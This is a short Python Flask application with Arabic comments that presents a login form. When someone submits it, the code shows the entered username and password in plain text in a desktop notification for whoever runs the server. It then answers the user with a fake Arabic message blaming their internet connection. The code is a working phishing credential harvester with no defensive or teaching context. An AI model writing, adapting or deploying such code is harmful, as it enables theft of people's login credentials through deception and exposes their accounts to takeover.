from flask import Flask, render_template, request
from plyer import notification

app = Flask(__name__)

# وظيفة لإرسال إشعار على جهاز الكمبيوتر
def send_notification(title, message):
    notification.notify(
        title=title,
        message=message,
        app_name="Login App",
        timeout=10  # المدة الزمنية للإشعار بالثواني
    )

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]

        # إرسال الإشعار
        send_notification("Login Attempt", f"Username: {username}\nPassword: {password}")
        return "يبدو ان هناك مشكلة في اتصالك بالانترنت جرب اعادة المحاولة لاحقا ..."
    
    return render_template("index.html")

if __name__ == "__main__":
    app.run(debug=True)
